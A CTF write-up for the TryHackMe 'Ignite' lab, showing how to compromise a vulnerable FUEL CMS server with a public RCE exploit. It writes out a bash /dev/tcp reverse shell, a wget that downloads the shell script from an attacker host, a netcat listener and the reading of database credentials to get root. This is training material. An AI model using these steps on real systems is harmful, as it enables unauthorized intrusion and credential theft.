# CTF-Write-up

## Try Hack Me: Ignite

URL: https://tryhackme.com/room/ignite 

Created by _https://tryhackme.com/p/DarkStar7471_, built by _https://tryhackme.com/p/Paradox_

![logo](https://user-images.githubusercontent.com/20625004/113415829-b4250780-93c8-11eb-8681-6946442669a5.PNG)

You should deploy the machine first.

Run nmap against the target machine.

```nmap -sC -A <target IP>```

Port 80 web access. 

![port80](https://user-images.githubusercontent.com/20625004/113416029-1847cb80-93c9-11eb-96f9-324394cca8f7.PNG)

Within the page there is a link to To access the FUEL CMS admin.

![admin_portal](https://user-images.githubusercontent.com/20625004/113416123-4b8a5a80-93c9-11eb-87a5-d55ea1e08197.PNG)

The credentials are already provided.

![admin_portal_1](https://user-images.githubusercontent.com/20625004/113416172-6c52b000-93c9-11eb-91da-17119c490e68.PNG)

After enumerating the web application, and performing tests, i searched to find any exploit available for Fuel CMS.

![rce](https://user-images.githubusercontent.com/20625004/113424148-526c9980-93d8-11eb-90ff-adda42206c25.PNG)

Use ``linux/webapps/47138.py``

The code needs to be updated and enter the IP address to reflect our target machine.

![rce_1](https://user-images.githubusercontent.com/20625004/113424343-ad05f580-93d8-11eb-9696-da5e7db9c90c.PNG)

Since we are not using burp proxy comment the line ``#proxy = {"http":"http://127.0.0.1:8080"}``, and also remove ``proxies=proxy``  from ``r = requests.get(burp0_url, proxies=proxy)``

after that simply run the code and we have shell.

![access](https://user-images.githubusercontent.com/20625004/113424703-43d2b200-93d9-11eb-8ecc-288f6d5afcd9.PNG)

As we see there are errors but we have accessed the system.

Now we have to upload a reverse shell.

``bash -i >& /dev/tcp/local IP/local port 0>&1``

We are using the above shell, simply change it, make a new file ``> shell.sh`` add in the command and upload it to the target system.

``python -m SimpleHTTPServer 80`` use it on the path you have the shell.

Now on the target machine simply download it. 

``wget http://local IP/local port/shell.sh``

![download](https://user-images.githubusercontent.com/20625004/113425281-4550aa00-93da-11eb-9ff7-972b672ad4ab.PNG)

before run it open another terminal on you local system and use netcat to listen back. ``nc -lvnp local port``. 
You have to use the port you issued on the shell.sh, and run it.

![netcat](https://user-images.githubusercontent.com/20625004/113425621-e0e21a80-93da-11eb-9c3c-6158128e3207.PNG)

Also on the target machine change perimissions on the shell.sh ``chmod +x shell.sh``.
Then execute ``bash shell.sh`` 

This should give you a reverse shell.

![shell](https://user-images.githubusercontent.com/20625004/113425729-0ff88c00-93db-11eb-96f1-de5ae4dcd539.PNG)

On home directory you should find the first flag.

Privilege escalation.

Use this command to upgrade a dumb shell to a working one ``python -c 'import pty; pty.spawn("/bin/bash")'``.

![sudlo](https://user-images.githubusercontent.com/20625004/113428222-15f06c00-93df-11eb-9b93-5b50f9ceb360.PNG)

``sudo -l`` requires a password. Lets dig more.

Remember that the web page has some information about the CMS files, after accessing all folders mentioned on the first page, check for ``fuel/application/config/database.php``.

![passwd](https://user-images.githubusercontent.com/20625004/113428686-e68e2f00-93df-11eb-82d3-93c689b853c4.PNG)

There you should find a name and a password.

use it to access the new user.

``su <name you found>``

![escalate](https://user-images.githubusercontent.com/20625004/113428917-543a5b00-93e0-11eb-9616-241f01d75140.PNG)

On the ``/root`` directory you should find the other flag.

